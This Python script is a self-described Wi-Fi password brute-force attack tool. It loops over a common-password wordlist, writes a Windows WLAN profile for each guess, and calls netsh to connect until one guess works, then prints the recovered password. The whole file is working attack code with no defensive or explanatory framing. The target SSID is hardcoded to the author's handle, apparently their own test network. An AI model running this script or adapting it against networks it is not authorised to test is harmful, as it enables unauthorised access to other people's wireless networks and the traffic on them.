import os
from tqdm import tqdm
from colorama import Fore, Style, init
import subprocess
import banners

# Initialize colorama
init()
os.system('title @peymanx Wi-Fi Password Brute-force attack')
banners.wifi_modem()


def create_wifi_profile(ssid, password):
    profile_content = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
    profile_path = f'{ssid}.xml'
    with open(profile_path, 'w') as file:
        file.write(profile_content)
    return profile_path

def connect_to_wifi(ssid, password):
    profile_path = create_wifi_profile(ssid, password)
    add_profile_command = f'netsh wlan add profile filename="{profile_path}"'
    connect_command = f'netsh wlan connect name="{ssid}"'
    os.system(add_profile_command)
    result = os.system(connect_command)
    os.remove(profile_path)
    return result == 0

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]

def main():
    ssid = 'peymanx'
    password_file = './passwords/common.txt'

    passwords = read_passwords(password_file)
    total_passwords = len(passwords)

    max_password_length = max(len(password) for password in passwords)
    with tqdm(total=total_passwords, desc="Trying passwords", unit="password") as pbar:
        for password in passwords:
            padded_password = password.ljust(max_password_length)
            pbar.set_description(f"{Fore.YELLOW}Trying password: {padded_password}{Style.RESET_ALL}")
            if connect_to_wifi(ssid, password):
                print(f'\n{Fore.GREEN}{"*"*70}')
                print(f'{Fore.GREEN}Successfully connected!')  # Blinking text
                print(f'{Fore.GREEN}Password: \'\033[5m{password}\033[0m{Fore.GREEN}\'')  # Blinking text
                print(f'{Fore.GREEN}{"*"*70}{Style.RESET_ALL}\n')
                break
            pbar.update(1)
        else:
            print(f'\n{Fore.RED}Password not found{Style.RESET_ALL}')

if __name__ == '__main__':
    main()